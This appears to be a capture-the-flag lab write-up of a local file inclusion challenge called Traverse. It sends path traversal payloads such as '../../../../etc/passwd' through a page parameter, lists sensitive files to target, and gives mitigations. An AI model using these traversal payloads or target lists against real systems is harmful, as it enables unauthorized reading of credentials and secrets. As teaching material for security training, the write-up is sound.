---
title: "Local File Inclusion – Arbitrary File Read | Traverse"
date: 2026-05-30 00:00:00 +0530
categories: [A02 - Security Misconfiguration, Local File Inclusion]
tags: [webversepro, lfi, local-file-inclusion, directory-traversal, arbitrary-file-read, path-traversal]
author: Shivansh Sharma
image:
path: /assets/images/posts/traverse-local-file-inclusion.webp
alt: Local File Inclusion – Arbitrary File Read | Traverse
----------------------------------------------------------

## Lab Link

Lab: [Traverse](https://dashboard.webverselabs-pro.com/challenges/traverse)

---

## Overview

Traverse is a documentation portal for a developer-tools startup. The site serves documentation pages dynamically using a filename supplied through a URL parameter.

Instead of restricting requests to approved documentation files, the application directly trusts user input when constructing file paths.

This allows attackers to traverse directories outside the intended document root and read arbitrary files from the underlying server.

The vulnerability ultimately allows retrieval of sensitive files, including the challenge flag.

---

## Objective

Exploit the page rendering functionality to read files outside the intended documentation directory and recover the flag.

---

## Vulnerability Identification

This challenge is primarily a Local File Inclusion (LFI) vulnerability.

### Classification Hierarchy

A02 - Security Misconfiguration
└── Insecure File Handling
└── Path Traversal
└── Local File Inclusion (LFI)

---

## Reconnaissance

Upon visiting the application, the browser is redirected to:

```text
https://32326fc6-4065-traverse-2f2b0.challenges.webverselabs-pro.com/page?name=home.html
```

The application loads documentation pages using a user-supplied parameter:

```text
name=home.html
```

Whenever a filename is passed directly through a URL parameter, path traversal testing should be performed.

This often indicates that the backend is reading files directly from the filesystem.

---

## Exploitation

### Step 1 - Identify the File Parameter

The page content changes according to:

```text
name=home.html
```

This suggests the application is loading a file specified by the client.

A common test is directory traversal.

---

### Step 2 - Test Path Traversal

Replace the filename with a traversal payload:

```text
../../../../etc/passwd
```

Resulting URL:

```text
/page?name=../../../../etc/passwd
```

The application successfully returns the contents of:

```text
/etc/passwd
```

This confirms that user input is being used directly in filesystem operations.

The vulnerability is now confirmed.

---

### Step 3 - Analyze the Impact

Successful retrieval of:

```text
/etc/passwd
```

demonstrates:

* Arbitrary file read
* Directory traversal
* Lack of path validation
* Access outside the document root

At this point, sensitive files on the server become accessible.

---

### Step 4 - Search for the Flag

Since the challenge flag is typically stored on the filesystem, attempt to access:

```text
../../../../../flag.txt
```

Resulting request:

```text
/page?name=../../../../../flag.txt
```

---

### Step 5 - Retrieve the Flag

The application returns:

```text
WEBVERSE{....}
```

The flag is successfully disclosed through the Local File Inclusion vulnerability.

---

## Proof of Exploitation

### Original Request

```text
/page?name=home.html
```

### Path Traversal Test

```text
/page?name=../../../../etc/passwd
```

### Successful File Read

```text
/etc/passwd
```

### Flag Retrieval

```text
/page?name=../../../../../flag.txt
```

### Flag

```text
WEBVERSE{....}
```

---

## Impact

An attacker can:

* Read arbitrary files.
* Access application source code.
* Retrieve configuration files.
* Obtain credentials and secrets.
* Discover internal infrastructure details.
* Expose sensitive business data.

Common targets include:

```text
/etc/passwd
.env
config.yml
database.yml
application.properties
web.config
flag.txt
```

In real-world environments, file disclosure frequently leads to further compromise.

---

## Mitigation

### Validate File Paths

Only allow access to approved files.

Example:

```python
allowed_pages = [
    "home.html",
    "docs.html",
    "api.html"
]
```

### Restrict Directory Traversal

Reject path traversal sequences such as:

```text
../
..\\
%2e%2e/
```

### Use Canonical Path Validation

Resolve paths before use and verify that they remain inside the intended document directory.

### Implement Allowlists

Avoid constructing filesystem paths directly from user input.

### Run Services with Least Privilege

Restrict filesystem access to only required directories.

### Perform Security Testing

Review all parameters that influence:

```text
file
path
page
template
document
include
resource
```

for traversal vulnerabilities.

---

## Real-World Insight

Local File Inclusion and directory traversal vulnerabilities continue to appear in web applications whenever user input is incorporated into filesystem operations without validation.

Developers often assume users will only request legitimate content files. Attackers instead supply traversal sequences to escape the intended directory structure.

Real-world consequences have included:

* Source code disclosure
* Credential exposure
* Cloud secret leakage
* Database compromise
* Remote code execution chains

The Traverse challenge demonstrates a classic security lesson:

**Any user-controlled file path should be treated as hostile input until proven otherwise.**
